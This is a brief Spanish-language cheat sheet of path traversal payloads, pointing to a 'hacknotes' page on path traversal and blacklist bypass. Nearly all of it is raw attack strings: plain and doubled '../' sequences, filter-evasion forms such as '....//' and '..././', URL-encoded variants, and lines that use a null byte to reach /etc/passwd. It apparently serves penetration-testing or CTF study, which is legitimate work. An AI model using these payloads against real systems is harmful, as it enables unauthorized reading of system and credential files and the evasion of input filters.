EXPLICACIÓN DETALLADA EN [Path Traversal & Blacklists](https://hacknotes.github.io/vulnerabilidades/pathTraversal/).

```python

../
/../../
../../../../../

....//
//....//....
....//....//....//

.?/.*/.?/
.?/.*/.?/.?/.*/.?/

 %2e%2e%2f
 %2F..%2F..%2F..
 %2e%2e%2f%2e%2e%2f%2e%2e%2f

../../../../../../../../../../etc/passwd%00
/../../../../../../../../../../etc/passwd%00

..././
..././..././..././..././..././
 ```
